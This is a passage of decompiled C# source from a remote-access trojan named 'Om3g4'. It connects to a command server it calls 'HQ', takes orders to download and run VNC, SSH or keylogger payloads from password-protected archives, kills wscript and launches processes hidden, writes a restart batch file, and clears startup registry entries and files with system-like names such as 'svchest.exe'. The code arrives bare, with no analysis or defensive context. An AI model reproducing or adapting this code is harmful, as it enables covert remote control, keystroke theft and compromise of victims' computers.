					process = new Process();
					goto IL_011e;
					IL_011e:
					num = 16;
					fileName = "tskill.exe";
					goto IL_0128;
					IL_0128:
					num = 17;
					process.StartInfo.Arguments = "wscript";
					goto IL_013c;
					IL_013c:
					num = 18;
					process.StartInfo.FileName = fileName;
					goto IL_014c;
					IL_014c:
					num = 19;
					process.StartInfo.UseShellExecute = false;
					goto IL_015c;
					IL_015c:
					num = 20;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_016c;
					IL_016c:
					num = 21;
					process.StartInfo.CreateNoWindow = true;
					goto IL_017c;
					IL_017c:
					num = 22;
					process.Start();
					goto IL_0187;
					IL_0187:
					num = 23;
					process.WaitForExit();
					goto IL_0191;
					IL_0191:
					num = 24;
					File.Move(Application.get_StartupPath() + "\\" + appname, ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\" + text);
					goto IL_01ce;
					IL_01ce:
					num = 25;
					if (File.Exists(text2))
					{
						goto IL_01da;
					}
					goto IL_01e4;
					IL_01da:
					num = 26;
					File.Delete(text2);
					goto IL_01e4;
					IL_01e4:
					num = 28;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_020b;
					}
					goto IL_02a9;
					IL_020b:
					num = 29;
					FileSystem.SetAttr(StartupFolder + "\\lsess.exe", (FileAttribute)0);
					goto IL_0225;
					IL_0225:
					num = 30;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\lsess.exe"))
					{
						goto IL_024a;
					}
					goto IL_0263;
					IL_024a:
					num = 31;
					File.Delete(StartupFolder + "\\lsess.exe");
					goto IL_0263;
					IL_0263:
					num = 33;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\svchest.exe"))
					{
						goto IL_028b;
					}
					goto IL_0385;
					IL_028b:
					num = 34;
					File.Delete(StartupFolder + "\\svchest.exe");
					goto IL_0385;
					IL_02a9:
					num = 37;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_02ef;
					}
					goto IL_0385;
					IL_02ef:
					num = 38;
					FileSystem.SetAttr(StartupFolder + "\\lsess.exe", (FileAttribute)0);
					goto IL_0309;
					IL_0309:
					num = 39;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\lsess.exe"))
					{
						goto IL_032e;
					}
					goto IL_0347;
					IL_032e:
					num = 40;
					File.Delete(StartupFolder + "\\lsess.exe");
					goto IL_0347;
					IL_0347:
					num = 42;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\svchest.exe"))
					{
						goto IL_036c;
					}
					goto IL_0385;
					IL_036c:
					num = 43;
					File.Delete(StartupFolder + "\\svchest.exe");
					goto IL_0385;
					IL_0385:
					num = 46;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("svcfile");
					goto IL_03ad;
					IL_03ad:
					num = 47;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("sysfile");
					goto IL_03d5;
					IL_03d5:
					num = 48;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("patience");
					goto IL_03fd;
					IL_03fd:
					num = 49;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Om3g4", writable: true)!.DeleteValue("CurrentVersion");
					goto IL_0425;
					IL_0425:
					num = 50;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Om3g4", writable: true)!.DeleteValue("Om3g4D");
					goto IL_044d;
					IL_044d:
					num = 51;
					if (Directory.Exists(ServerExchangeFolder))
					{
						goto IL_045e;
					}
					goto IL_0487;
					IL_045e:
					num = 52;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteDirectory(ServerExchangeFolder.Replace("e\\", "e"), (DeleteDirectoryOption)5);
					goto IL_0487;
					end_IL_0001_2:
					break;
				}
				num = 56;
				Application.Exit();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 1443;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void ServerExchange()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		string fileName = default(string);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		Process process = default(Process);
		string fileName2 = default(string);
		Process process2 = default(Process);
		string fileName3 = default(string);
		FileInfo fileInfo2 = default(FileInfo);
		FileStream stream = default(FileStream);
		StreamWriter streamWriter = default(StreamWriter);
		Process process3 = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 2417:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0029;
						case 4:
							goto IL_0048;
						case 5:
							goto IL_0067;
						case 6:
							goto IL_007b;
						case 7:
							goto IL_00a6;
						case 8:
							goto IL_00c9;
						case 9:
							goto IL_00dd;
						case 11:
							goto IL_00f7;
						case 12:
							goto IL_011b;
						case 14:
							goto IL_0132;
						case 15:
							goto IL_0156;
						case 16:
							goto IL_016b;
						case 10:
						case 13:
						case 17:
						case 18:
							goto IL_0181;
						case 19:
							goto IL_018c;
						case 20:
							goto IL_0197;
						case 21:
							goto IL_01ac;
						case 22:
							goto IL_01be;
						case 23:
							goto IL_01cf;
						case 24:
							goto IL_01e0;
						case 25:
							goto IL_01f1;
						case 26:
							goto IL_01fd;
						case 27:
							goto IL_0208;
						case 28:
							goto IL_0238;
						case 29:
							goto IL_0245;
						case 30:
						case 31:
							goto IL_0250;
						case 32:
							goto IL_0277;
						case 33:
							goto IL_0291;
						case 34:
							goto IL_02b6;
						case 35:
						case 36:
							goto IL_02cf;
						case 37:
							goto IL_02f7;
						case 40:
							goto IL_0315;
						case 41:
							goto IL_035b;
						case 42:
							goto IL_0375;
						case 43:
							goto IL_039a;
						case 44:
						case 45:
							goto IL_03b3;
						case 46:
							goto IL_03d8;
						case 38:
						case 39:
						case 47:
						case 48:
						case 49:
							goto IL_03f1;
						case 50:
							goto IL_0419;
						case 51:
							goto IL_0441;
						case 52:
							goto IL_0469;
						case 53:
							goto IL_0491;
						case 54:
							goto IL_04b9;
						case 55:
							goto IL_04c3;
						case 56:
							goto IL_04d9;
						case 57:
						case 58:
							goto IL_04ed;
						case 59:
							goto IL_0503;
						case 60:
						case 61:
							goto IL_0517;
						case 62:
							goto IL_0531;
						case 63:
							goto IL_053c;
						case 64:
							goto IL_0552;
						case 65:
							goto IL_059b;
						case 66:
							goto IL_05ad;
						case 67:
							goto IL_05be;
						case 68:
							goto IL_05cf;
						case 69:
							goto IL_05e0;
						case 70:
							goto IL_05ec;
						case 71:
							goto IL_05f7;
						case 72:
							goto IL_0603;
						case 73:
							goto IL_060e;
						case 74:
							goto IL_062b;
						case 75:
							goto IL_0638;
						case 76:
							goto IL_0653;
						case 77:
							goto IL_0663;
						case 78:
							goto IL_0673;
						case 79:
							goto IL_0683;
						case 80:
							goto IL_0693;
						case 81:
							goto IL_06d8;
						case 82:
							goto IL_06f3;
						case 83:
							goto IL_070e;
						case 84:
							goto IL_071e;
						case 85:
							goto IL_0734;
						case 86:
							goto IL_073f;
						case 87:
							goto IL_0749;
						case 88:
							goto IL_0754;
						case 89:
							goto IL_076a;
						case 90:
							goto IL_077c;
						case 91:
							goto IL_078d;
						case 92:
							goto IL_079e;
						case 93:
							goto IL_07aa;
						case 94:
							goto IL_07b5;
						case 95:
							goto IL_07c2;
						case 96:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 97:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_07c2:
					num = 95;
					fileInfo.Delete();
					break;
					IL_07b5:
					num = 94;
					fileInfo = new FileInfo(fileName);
					goto IL_07c2;
					IL_000a:
					num = 2;
					text = TempFolder + "\\" + ExchangeServer + ".txt";
					goto IL_0029;
					IL_0029:
					num = 3;
					text2 = TempFolder + "\\" + ExchangeServer + ".exe";
					goto IL_0048;
					IL_0048:
					num = 4;
					text3 = TempFolder + "\\" + ExchangeServer + ".rar";
					goto IL_0067;
					IL_0067:
					num = 5;
					text4 = TempFolder + "\\0m3g4-Version.txt";
					goto IL_007b;
					IL_007b:
					num = 6;
					text5 = Conversions.ToString(DateAndTime.get_Now().TimeOfDay.TotalMilliseconds) + ".old";
					goto IL_00a6;
					IL_00a6:
					num = 7;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_00c9;
					}
					goto IL_00f7;
					IL_00c9:
					num = 8;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_00dd;
					IL_00dd:
					num = 9;
					text6 = Environment.SystemDirectory + "\\svchest.exe";
					goto IL_0181;
					IL_00f7:
					num = 11;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista"))
					{
						goto IL_011b;
					}
					goto IL_0132;
					IL_011b:
					num = 12;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_0181;
					IL_0132:
					num = 14;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_0156;
					}
					goto IL_0181;
					IL_0156:
					num = 15;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_016b;
					IL_016b:
					num = 16;
					text6 = RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
					goto IL_0181;
					IL_0181:
					num = 18;
					process = new Process();
					goto IL_018c;
					IL_018c:
					num = 19;
					fileName2 = "tskill.exe";
					goto IL_0197;
					IL_0197:
					num = 20;
					process.StartInfo.Arguments = "wscript";
					goto IL_01ac;
					IL_01ac:
					num = 21;
					process.StartInfo.FileName = fileName2;
					goto IL_01be;
					IL_01be:
					num = 22;
					process.StartInfo.UseShellExecute = false;
					goto IL_01cf;
					IL_01cf:
					num = 23;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_01e0;
					IL_01e0:
					num = 24;
					process.StartInfo.CreateNoWindow = true;
					goto IL_01f1;
					IL_01f1:
					num = 25;
					process.Start();
					goto IL_01fd;
					IL_01fd:
					num = 26;
					process.WaitForExit();
					goto IL_0208;
					IL_0208:
					num = 27;
					File.Move(Application.get_StartupPath() + "\\" + appname, TempFolder + "\\" + text5);
					goto IL_0238;
					IL_0238:
					num = 28;
					if (File.Exists(text6))
					{
						goto IL_0245;
					}
					goto IL_0250;
					IL_0245:
					num = 29;
					File.Delete(text6);
					goto IL_0250;
					IL_0250:
					num = 31;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_0277;
					}
					goto IL_0315;
					IL_0277:
					num = 32;
					FileSystem.SetAttr(StartupFolder + "\\lsess.exe", (FileAttribute)0);
					goto IL_0291;
					IL_0291:
					num = 33;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\lsess.exe"))
					{
						goto IL_02b6;
					}
					goto IL_02cf;
					IL_02b6:
					num = 34;
					File.Delete(StartupFolder + "\\lsess.exe");
					goto IL_02cf;
					IL_02cf:
					num = 36;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\svchest.exe"))
					{
						goto IL_02f7;
					}
					goto IL_03f1;
					IL_02f7:
					num = 37;
					File.Delete(StartupFolder + "\\svchest.exe");
					goto IL_03f1;
					IL_0315:
					num = 40;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista") | ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_035b;
					}
					goto IL_03f1;
					IL_035b:
					num = 41;
					FileSystem.SetAttr(StartupFolder + "\\lsess.exe", (FileAttribute)0);
					goto IL_0375;
					IL_0375:
					num = 42;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\lsess.exe"))
					{
						goto IL_039a;
					}
					goto IL_03b3;
					IL_039a:
					num = 43;
					File.Delete(StartupFolder + "\\lsess.exe");
					goto IL_03b3;
					IL_03b3:
					num = 45;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(StartupFolder + "\\svchest.exe"))
					{
						goto IL_03d8;
					}
					goto IL_03f1;
					IL_03d8:
					num = 46;
					File.Delete(StartupFolder + "\\svchest.exe");
					goto IL_03f1;
					IL_03f1:
					num = 49;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("svcfile");
					goto IL_0419;
					IL_0419:
					num = 50;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("sysfile");
					goto IL_0441;
					IL_0441:
					num = 51;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("patience");
					goto IL_0469;
					IL_0469:
					num = 52;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Om3g4", writable: true)!.DeleteValue("CurrentVersion");
					goto IL_0491;
					IL_0491:
					num = 53;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Om3g4", writable: true)!.DeleteValue("Om3g4D");
					goto IL_04b9;
					IL_04b9:
					num = 54;
					Victim_Offline();
					goto IL_04c3;
					IL_04c3:
					num = 55;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text2))
					{
						goto IL_04d9;
					}
					goto IL_04ed;
					IL_04d9:
					num = 56;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text2);
					goto IL_04ed;
					IL_04ed:
					num = 58;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text3))
					{
						goto IL_0503;
					}
					goto IL_0517;
					IL_0503:
					num = 59;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text3);
					goto IL_0517;
					IL_0517:
					num = 61;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(ExchangeFile, text3);
					goto IL_0531;
					IL_0531:
					num = 62;
					process2 = new Process();
					goto IL_053c;
					IL_053c:
					num = 63;
					fileName3 = ToolsFolder + "\\rar.exe";
					goto IL_0552;
					IL_0552:
					num = 64;
					process2.StartInfo.Arguments = "e -pp1cc1!!o " + text3 + " " + TempFolder + "\\";
					goto IL_059b;
					IL_059b:
					num = 65;
					process2.StartInfo.FileName = fileName3;
					goto IL_05ad;
					IL_05ad:
					num = 66;
					process2.StartInfo.UseShellExecute = false;
					goto IL_05be;
					IL_05be:
					num = 67;
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_05cf;
					IL_05cf:
					num = 68;
					process2.StartInfo.CreateNoWindow = true;
					goto IL_05e0;
					IL_05e0:
					num = 69;
					process2.Start();
					goto IL_05ec;
					IL_05ec:
					num = 70;
					process2.WaitForExit();
					goto IL_05f7;
					IL_05f7:
					num = 71;
					fileInfo2 = new FileInfo(text3);
					goto IL_0603;
					IL_0603:
					num = 72;
					fileInfo2.Delete();
					goto IL_060e;
					IL_060e:
					num = 73;
					stream = new FileStream(TempFolder + "\\0m3g4-Restart.bat", FileMode.Create, FileAccess.Write);
					goto IL_062b;
					IL_062b:
					num = 74;
					streamWriter = new StreamWriter(stream);
					goto IL_0638;
					IL_0638:
					num = 75;
					streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_0653;
					IL_0653:
					num = 76;
					streamWriter.WriteLine("tskill wscript");
					goto IL_0663;
					IL_0663:
					num = 77;
					streamWriter.WriteLine("tskill lsess");
					goto IL_0673;
					IL_0673:
					num = 78;
					streamWriter.WriteLine("tskill svchest");
					goto IL_0683;
					IL_0683:
					num = 79;
					streamWriter.WriteLine("ping 127.0.0.1 -n 7 >%tmp%\\nul");
					goto IL_0693;
					IL_0693:
					num = 80;
					streamWriter.WriteLine("del \"" + TempFolder + "\\" + text5 + "\"");
					goto IL_06d8;
					IL_06d8:
					num = 81;
					streamWriter.WriteLine("del \"" + text + "\"");
					goto IL_06f3;
					IL_06f3:
					num = 82;
					streamWriter.WriteLine("del \"" + text4 + "\"");
					goto IL_070e;
					IL_070e:
					num = 83;
					streamWriter.WriteLine("ping 127.0.0.1 -n 5 >%tmp%\\nul");
					goto IL_071e;
					IL_071e:
					num = 84;
					streamWriter.WriteLine("start " + text2);
					goto IL_0734;
					IL_0734:
					num = 85;
					streamWriter.Close();
					goto IL_073f;
					IL_073f:
					num = 86;
					ExchangeNotify();
					goto IL_0749;
					IL_0749:
					num = 87;
					process3 = new Process();
					goto IL_0754;
					IL_0754:
					num = 88;
					fileName = TempFolder + "\\0m3g4-Restart.bat";
					goto IL_076a;
					IL_076a:
					num = 89;
					process3.StartInfo.FileName = fileName;
					goto IL_077c;
					IL_077c:
					num = 90;
					process3.StartInfo.UseShellExecute = false;
					goto IL_078d;
					IL_078d:
					num = 91;
					process3.StartInfo.CreateNoWindow = true;
					goto IL_079e;
					IL_079e:
					num = 92;
					process3.Start();
					goto IL_07aa;
					IL_07aa:
					num = 93;
					process3.WaitForExit();
					goto IL_07b5;
					end_IL_0001_2:
					break;
				}
				num = 96;
				Application.Exit();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 2417;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void HQUplink()
	{
		HQ = new TcpClient();
		if (!HQ.Connected)
		{
			try
			{
				HQ.Connect(RemoteNotifier, Conversions.ToInteger(HQUpLinkPort));
				Thread.Sleep(2000);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Thread.Sleep(15000);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void RecieveOrders()
	{
		if (!HQ.Connected)
		{
			HQUplink();
		}
		if (!HQ.Connected)
		{
			return;
		}
		HQ.SendTimeout = 5000;
		try
		{
			lock (HQ.GetStream())
			{
				StreamReader streamReader = new StreamReader(HQ.GetStream());
				Orders = null;
				while (streamReader.Peek() > -1)
				{
					Orders += Convert.ToChar(streamReader.Read());
				}
				if (Operators.CompareString(Orders, "Vnc-Exchange", false) == 0)
				{
					ExchangeFile = null;
					ExchangeServer = null;
					ExchangeFile = VncFile;
					ExchangeServer = "0m3g4-Vnc";
					ServerExchange();
				}
				else if (Operators.CompareString(Orders, "sSH-Exchange", false) == 0)
				{
					ExchangeFile = null;
					ExchangeServer = null;
					ExchangeFile = sSHFile;
					ExchangeServer = "0m3g4-sSH";
					ServerExchange();
				}
				else if (Operators.CompareString(Orders, "KeyLogger-Exchange", false) == 0)
				{
					ExchangeFile = null;
					ExchangeServer = null;
					ExchangeFile = KeyLoggerFile;
					ExchangeServer = "0m3g4-KeyLogger";
					ServerExchange();
				}
				else if (Operators.CompareString(Orders, "Classified", false) == 0)
				{
					TheXFiles();
				}
				else if (Operators.CompareString(Orders, "Self-Destruct", false) == 0)
				{
					SelfDestruct();
				}
			}
			HQ.Client.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			RecieveOrders();
			ProjectData.ClearProjectError();
		}
	}

	private void Server()
	{
		HQ = new TcpClient();
		while (!HQ.Connected)
		{
			HQUplink();
		}
		while (true)
		{
			RecieveOrders();
		}
	}
}
